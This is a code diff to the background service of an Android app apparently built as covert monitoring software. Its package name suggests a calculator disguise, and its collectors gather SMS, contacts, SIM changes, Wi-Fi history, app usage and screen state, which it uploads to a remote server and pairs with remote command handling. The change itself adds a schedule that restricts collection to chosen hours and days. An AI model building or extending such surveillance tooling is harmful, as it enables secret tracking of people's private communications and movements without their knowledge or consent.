@@ -39,6 +39,8 @@ import com.stealthcalc.monitoring.collector.ScreenStateCollector
 import com.stealthcalc.monitoring.collector.SimChangeCollector
 import com.stealthcalc.monitoring.collector.SmsCollector
 import com.stealthcalc.monitoring.collector.WifiHistoryCollector
+import android.content.SharedPreferences
+import com.stealthcalc.core.di.EncryptedPrefs
 import com.stealthcalc.monitoring.service.RemoteCommandHandler
 import com.stealthcalc.monitoring.data.MonitoringRepository
 import com.stealthcalc.monitoring.network.AgentApiClient
@@ -106,6 +108,7 @@ class AgentService : LifecycleService() {
     @Inject lateinit var contactChangeCollector: ContactChangeCollector
     @Inject lateinit var remoteCommandHandler: RemoteCommandHandler
     @Inject lateinit var apiClient: AgentApiClient
+    @Inject @EncryptedPrefs lateinit var prefs: SharedPreferences
 
     private var collectJob: Job? = null
     private var uploadJob: Job? = null
@@ -149,6 +152,10 @@ class AgentService : LifecycleService() {
         collectJob?.cancel()
         collectJob = lifecycleScope.launch {
             while (isActive) {
+                if (!isWithinSchedule()) {
+                    delay(getSmartInterval())
+                    continue
+                }
                 runCatching {
                     appUsageCollector.collect()
                     batteryCollector.collect()
@@ -227,6 +234,19 @@ class AgentService : LifecycleService() {
         val percent = if (scale > 0) (level * 100) / scale else 100
         return if (percent <= LOW_BATTERY_THRESHOLD) COLLECT_INTERVAL_LOW_BATTERY_MS
         else COLLECT_INTERVAL_NORMAL_MS
+    }
+
+    private fun isWithinSchedule(): Boolean {
+        val enabled = prefs.getBoolean("schedule_enabled", false)
+        if (!enabled) return true
+        val startHour = prefs.getInt("schedule_start_hour", 0)
+        val endHour = prefs.getInt("schedule_end_hour", 24)
+        val daysStr = prefs.getString("schedule_days", "1,2,3,4,5,6,7") ?: "1,2,3,4,5,6,7"
+        val days = daysStr.split(",").mapNotNull { it.trim().toIntOrNull() }.toSet()
+        val cal = java.util.Calendar.getInstance()
+        val dayOfWeek = cal.get(java.util.Calendar.DAY_OF_WEEK)
+        val hour = cal.get(java.util.Calendar.HOUR_OF_DAY)
+        return dayOfWeek in days && hour in startHour until endHour
     }
 
     override fun onBind(intent: Intent): IBinder? {
